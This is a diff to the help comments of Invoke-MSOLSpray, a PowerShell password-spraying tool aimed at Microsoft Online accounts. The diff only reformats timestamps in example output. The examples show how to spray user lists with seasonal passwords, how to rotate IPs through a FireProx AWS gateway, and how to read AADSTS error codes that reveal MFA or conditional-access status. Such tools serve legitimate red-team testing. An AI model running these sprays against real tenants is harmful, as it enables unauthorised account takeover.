@@ -26,7 +26,7 @@ function Invoke-MSOLSpray {
     .OUTPUTS
         Time                Username         Password   IsValid ResponseError
         ----                --------         --------   ------- -------------
-        2020-08-14 12:25:15 Steve@domain.com Winter2020   True  None.
+        2020-08-15T18:20:50.1611349+02:00 Steve@domain.com Winter2020   True  None.
     
     .PARAMETER Usernames
         Takes in a single or multiple usernames in the following format "user@domain.com". 
@@ -89,7 +89,7 @@ function Invoke-MSOLSpray {
         
         PS C:\> Invoke-MSOLSpray -Usernames Steve@domain.com -Passwords Winter2020
 
-        Time          : 2020-08-14 12:23:44
+        Time          : 2020-08-15T18:20:50.1611349+02:00
         Username      : Steve@domain.com
         Password      : Winter2020
         IsValid       : True
@@ -99,7 +99,7 @@ function Invoke-MSOLSpray {
 
         PS C:\> Invoke-MSOLSpray -Usernames Steve@domain.com -Passwords Winter2020 -URL https://api-gateway-endpoint-id.execute-api.us-east-1.amazonaws.com/fireprox
         
-        Time          : 2020-08-14 12:23:44
+        Time          : 2020-08-15T18:20:50.1611349+02:00
         Username      : Steve@domain.com
         Password      : Winter2020
         IsValid       : True
@@ -110,63 +110,63 @@ function Invoke-MSOLSpray {
         Valid results have been written to C:\outfile.txt
 
         PS C:\> gc C:\outfile.txt
-        Steve@domain.com : Winter2020 : None.
+        2020-08-15T18:20:50.1611349+02:00 : Steve@domain.com : Winter2020 : None.
 
     .EXAMPLE
         # The following command will use the provided UsernameList and attempt to authenticate to each account with a password of Winter2020.
         
         PS C:\> Invoke-MSOLSpray -UsernameList C:\UsernameList.txt -Password Winter2020 | Format-Table
 
-        Time                Username         Password   IsValid ResponseError
-        ----                --------         --------   ------- -------------
-        2020-08-14 12:25:15 Steve@domain.com Winter2020   True  None.
-        2020-08-14 12:25:15 John@domain.com  Winter2020   False AADSTS50126: Error validating credentials due to invalid username or password.
-        2020-08-14 12:25:15 Dave@domain.com  Winter2020   False AADSTS50126: Error validating credentials due to invalid username or password.
+        Time                               Username         Password   IsValid ResponseError
+        ----                               --------         --------   ------- -------------
+        2020-08-15T18:20:50.1611349+02:00  Steve@domain.com Winter2020   True  None.
+        2020-08-15T18:20:50.1611349+02:00  John@domain.com  Winter2020   False AADSTS50126: Error validating credentials due to invalid username or password.
+        2020-08-15T18:20:50.1611349+02:00  Dave@domain.com  Winter2020   False AADSTS50126: Error validating credentials due to invalid username or password.
     .EXAMPLE
         # The following command will use the provided usernames and both UsernameList and attempt to authenticate to each account with the passwords Summer2020 and Zomer2020.
         
         PS C:\> Invoke-MSOLSpray -Usernames Steve@domain.com,Klaas@domain.nl -UsernameList C:\domain_com_UsernameList.txt,C:\domein_nl_UsernameList.txt -Password Summer2020,Zomer2020 | Format-Table
 
-        Time                Username         Password    IsValid  ResponseError
-        ----                --------         --------    -------  -------------
-        2020-08-14 12:25:15 Steve@domain.com Summer2020  False    AADSTS50126: Error validating credentials due to invalid username or password.
-        2020-08-14 12:25:15 John@domain.com  Summer2020  True     None.
-        2020-08-14 12:25:15 Dave@domain.com  Summer2020  True     AADSTS50079: Due to a configuration change made by your administrator, or because you moved to a new location, you must enroll in multi-factor authentication to access '{identifier}'.
-        2020-08-14 12:25:15 klaas@domain.nl  Summer2020  False    AADSTS50126: Error validating credentials due to invalid username or password.
-        2020-08-14 12:25:15 jan@domain.nl    Summer2020  False    AADSTS50126: Error validating credentials due to invalid username or password.
-        2020-08-14 12:25:15 Steve@domain.com Zomer2020   False    AADSTS50126: Error validating credentials due to invalid username or password.
-        2020-08-14 12:25:15 John@domain.com  Zomer2020   False    AADSTS50126: Error validating credentials due to invalid username or password.
-        2020-08-14 12:25:15 Dave@domain.com  Zomer2020   False    AADSTS50126: Error validating credentials due to invalid username or password.
-        2020-08-14 12:25:15 klaas@domain.nl  Zomer2020   True     None.
-        2020-08-14 12:25:15 jan@domain.nl    Zomer2020   True     AADSTS53000: Device is not in required device state: compliant. Conditional Access policy requires a compliant device, and the device is not compliant. The user must enroll their device with an approved MDM provider like Intune.
+        Time                               Username         Password    IsValid  ResponseError
+        ----                               --------         --------    -------  -------------
+        2020-08-15T18:20:50.1611349+02:00  Steve@domain.com Summer2020  False    AADSTS50126: Error validating credentials due to invalid username or password.
+        2020-08-15T18:20:50.1611349+02:00  John@domain.com  Summer2020  True     None.
+        2020-08-15T18:20:50.1611349+02:00  Dave@domain.com  Summer2020  True     AADSTS50079: Due to a configuration change made by your administrator, or because you moved to a new location, you must enroll in multi-factor authentication to access '{identifier}'.
+        2020-08-15T18:20:50.1611349+02:00  klaas@domain.nl  Summer2020  False    AADSTS50126: Error validating credentials due to invalid username or password.
+        2020-08-15T18:20:50.1611349+02:00  jan@domain.nl    Summer2020  False    AADSTS50126: Error validating credentials due to invalid username or password.
+        2020-08-15T18:20:50.1611349+02:00  Steve@domain.com Zomer2020   False    AADSTS50126: Error validating credentials due to invalid username or password.
+        2020-08-15T18:20:50.1611349+02:00  John@domain.com  Zomer2020   False    AADSTS50126: Error validating credentials due to invalid username or password.
+        2020-08-15T18:20:50.1611349+02:00  Dave@domain.com  Zomer2020   False    AADSTS50126: Error validating credentials due to invalid username or password.
+        2020-08-15T18:20:50.1611349+02:00  klaas@domain.nl  Zomer2020   True     None.
+        2020-08-15T18:20:50.1611349+02:00  jan@domain.nl    Zomer2020   True     AADSTS53000: Device is not in required device state: compliant. Conditional Access policy requires a compliant device, and the device is not compliant. The user must enroll their device with an approved MDM provider like Intune.
 
     .EXAMPLE
         # The following command will use the provided usernames and attempt to authenticate to each account with the passwords from both PasswordLists
         
         PS C:\> Invoke-MSOLSpray -Usernames Steve@domain.com,John@domain.com -PasswordList C:\seasons_year.txt,C:\company_name_special_characters.txt
         
-        Time                Username         Password    IsValid ResponseError
-        ----                --------         --------    ------- -------------
-        2020-08-14 12:25:15 Steve@domain.com Spring2020  False   AADSTS50126: Error validating credentials due to invalid username or password.
-        2020-08-14 12:25:15 John@domain.com  Spring020   False   AADSTS50126: Error validating credentials due to invalid username or password.        
-        2020-08-14 12:25:15 Steve@domain.com Summer2020  False   AADSTS50126: Error validating credentials due to invalid username or password.
-        2020-08-14 12:25:15 John@domain.com  Summer2020  True    None.
-        2020-08-14 12:25:15 Steve@domain.com Fall2020    False   AADSTS50126: Error validating credentials due to invalid username or password.
-        2020-08-14 12:25:15 John@domain.com  Fall2020    False   AADSTS50126: Error validating credentials due to invalid username or password.
-        2020-08-14 12:25:15 Steve@domain.com Winter2020  True    None.
-        2020-08-14 12:25:15 John@domain.com  Winter2020  False   AADSTS50126: Error validating credentials due to invalid username or password.
-        2020-08-14 12:25:15 Steve@domain.com Spring2019  False   AADSTS50126: Error validating credentials due to invalid username or password.
-        2020-08-14 12:25:15 John@domain.com  Spring2019  False   AADSTS50126: Error validating credentials due to invalid username or password.        
-        2020-08-14 12:25:15 Steve@domain.com Summer2019  False   AADSTS50126: Error validating credentials due to invalid username or password.
-        2020-08-14 12:25:15 John@domain.com  Summer2019  False   AADSTS50126: Error validating credentials due to invalid username or password.
-        2020-08-14 12:25:15 Steve@domain.com Fall2019    False   AADSTS50126: Error validating credentials due to invalid username or password.
-        2020-08-14 12:25:15 John@domain.com  Fall2019    False   AADSTS50126: Error validating credentials due to invalid username or password.
-        2020-08-14 12:25:15 Steve@domain.com Winter2019  False   AADSTS50126: Error validating credentials due to invalid username or password.
-        2020-08-14 12:25:15 John@domain.com  Winter2019  False   AADSTS50126: Error validating credentials due to invalid username or password.
-        2020-08-14 12:25:15 Steve@domain.com Domain!     False   AADSTS50126: Error validating credentials due to invalid username or password.
-        2020-08-14 12:25:15 John@domain.com  Domain!     False   AADSTS50126: Error validating credentials due to invalid username or password.
-        2020-08-14 12:25:15 Steve@domain.com Domain@     False   AADSTS50126: Error validating credentials due to invalid username or password.
-        2020-08-14 12:25:15 John@domain.com  Domain@     False   AADSTS50126: Error validating credentials due to invalid username or password.
+        Time                               Username         Password    IsValid ResponseError
+        ----                               --------         --------    ------- -------------
+        2020-08-15T18:20:50.1611349+02:00  Steve@domain.com Spring2020  False   AADSTS50126: Error validating credentials due to invalid username or password.
+        2020-08-15T18:20:50.1611349+02:00  John@domain.com  Spring020   False   AADSTS50126: Error validating credentials due to invalid username or password.        
+        2020-08-15T18:20:50.1611349+02:00  Steve@domain.com Summer2020  False   AADSTS50126: Error validating credentials due to invalid username or password.
+        2020-08-15T18:20:50.1611349+02:00  John@domain.com  Summer2020  True    None.
+        2020-08-15T18:20:50.1611349+02:00  Steve@domain.com Fall2020    False   AADSTS50126: Error validating credentials due to invalid username or password.
+        2020-08-15T18:20:50.1611349+02:00  John@domain.com  Fall2020    False   AADSTS50126: Error validating credentials due to invalid username or password.
+        2020-08-15T18:20:50.1611349+02:00  Steve@domain.com Winter2020  True    None.
+        2020-08-15T18:20:50.1611349+02:00  John@domain.com  Winter2020  False   AADSTS50126: Error validating credentials due to invalid username or password.
+        2020-08-15T18:20:50.1611349+02:00  Steve@domain.com Spring2019  False   AADSTS50126: Error validating credentials due to invalid username or password.
+        2020-08-15T18:20:50.1611349+02:00  John@domain.com  Spring2019  False   AADSTS50126: Error validating credentials due to invalid username or password.        
+        2020-08-15T18:20:50.1611349+02:00  Steve@domain.com Summer2019  False   AADSTS50126: Error validating credentials due to invalid username or password.
+        2020-08-15T18:20:50.1611349+02:00  John@domain.com  Summer2019  False   AADSTS50126: Error validating credentials due to invalid username or password.
+        2020-08-15T18:20:50.1611349+02:00  Steve@domain.com Fall2019    False   AADSTS50126: Error validating credentials due to invalid username or password.
+        2020-08-15T18:20:50.1611349+02:00  John@domain.com  Fall2019    False   AADSTS50126: Error validating credentials due to invalid username or password.
+        2020-08-15T18:20:50.1611349+02:00  Steve@domain.com Winter2019  False   AADSTS50126: Error validating credentials due to invalid username or password.
+        2020-08-15T18:20:50.1611349+02:00  John@domain.com  Winter2019  False   AADSTS50126: Error validating credentials due to invalid username or password.
+        2020-08-15T18:20:50.1611349+02:00  Steve@domain.com Domain!     False   AADSTS50126: Error validating credentials due to invalid username or password.
+        2020-08-15T18:20:50.1611349+02:00  John@domain.com  Domain!     False   AADSTS50126: Error validating credentials due to invalid username or password.
+        2020-08-15T18:20:50.1611349+02:00  Steve@domain.com Domain@     False   AADSTS50126: Error validating credentials due to invalid username or password.
+        2020-08-15T18:20:50.1611349+02:00  John@domain.com  Domain@     False   AADSTS50126: Error validating credentials due to invalid username or password.
 
     .EXAMPLE
         # The following command will use input provided from the pipeline to authenticte.
@@ -180,15 +180,15 @@ function Invoke-MSOLSpray {
 
         PS C:\> $Object | Invoke-MSOLSpray | Format-Table -AutoSize
 
-        Time                Username         Password   IsValid ResponseError
-        ----                --------         --------   ------- -------------
-        2020-08-14 12:22:06 Steve@domain.com Summer2020   False AADSTS50126: Error validating credentials due to invalid username or password.
-        2020-08-14 12:22:06 Steve@domain.com Winter2020   True  None.
-        2020-08-14 12:22:06 Steve@domain.com Fall2020     False AADSTS50126: Error validating credentials due to invalid username or password.
-        2020-08-14 12:22:06 John@domain.com  Summer2020   True  None.
-        2020-08-14 12:22:06 John@domain.com  Winter2020   False AADSTS50126: Error validating credentials due to invalid username or password.
-        2020-08-14 12:22:06 John@domain.com  Fall2020     False AADSTS50126: Error validating credentials due to invalid username or password.           
-    #>
+        Time                               Username         Password   IsValid ResponseError
+        ----                               --------         --------   ------- -------------
+        2020-08-15T18:20:50.1611349+02:00  Steve@domain.com Summer2020   False AADSTS50126: Error validating credentials due to invalid username or password.
+        2020-08-15T18:20:50.1611349+02:00  Steve@domain.com Winter2020   True  None.
+        2020-08-15T18:20:50.1611349+02:00  Steve@domain.com Fall2020     False AADSTS50126: Error validating credentials due to invalid username or password.
+        2020-08-15T18:20:50.1611349+02:00  John@domain.com  Summer2020   True  None.
+        2020-08-15T18:20:50.1611349+02:00  John@domain.com  Winter2020   False AADSTS50126: Error validating credentials due to invalid username or password.
+        2020-08-15T18:20:50.1611349+02:00  John@domain.com  Fall2020     False AADSTS50126: Error validating credentials due to invalid username or password.           
+    #> 
     [cmdletbinding()]       
     Param(
         [Parameter(ValueFromPipelineByPropertyName)]
